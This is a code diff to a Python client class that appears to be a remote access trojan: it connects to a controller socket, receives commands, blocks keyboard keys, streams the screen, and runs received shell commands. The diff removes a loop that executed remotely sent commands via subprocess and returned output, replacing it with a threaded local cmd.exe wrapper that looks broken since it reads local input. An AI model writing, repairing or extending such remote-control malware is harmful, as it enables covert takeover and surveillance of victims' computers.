@@ -45,6 +45,7 @@ class SCRIPT_CLIENT:
         self.curdir = os.getcwd()
         self.connected = False
         self.s = None
+        self.shell_subprocess = None
 
     def build_connection(self):
         while not self.connected:
@@ -102,26 +103,37 @@ class SCRIPT_CLIENT:
                 keyboard.block_key(i)
         time.sleep(999999)
 
+    def run_shell(self):
+        try:
+            shell_subprocess = subprocess.Popen(
+                "cmd.exe",
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            while 1:
+                command = input("Shell >> ")
+                if command.lower() == 'return':
+                    return
+                
+                output = shell_subprocess.communicate(input=command)[0]
+                print(output)
+        except Exception as e:
+            print(str(e))
+
     def execute(self):
         
         while True:
             command = self.s.recv(1024).decode()
             
             if command == 'shell':
-                while 1:
-                    command = self.s.recv(1024).decode()
-                    if command.lower() == 'exit' :
-                        break
-                    if command == 'cd':
-                        os.chdir(command[3:].decode('utf-8'))
-                        dir = os.getcwd()
-                        dir1 = str(dir)
-                        self.s.send(dir1.encode())
-                    output = subprocess.getoutput(command)
-                    self.s.send(output.encode())
-                    if not output:
-                        self.errorsend()
-            
+                
+                shell_thread = threading.Thread(target=self.run_shell)
+                shell_thread.start()
+                print("Voltou para o princinpal")
+
             elif command == 'screenshare':
                 try:
                     from vidstream import ScreenShareClient
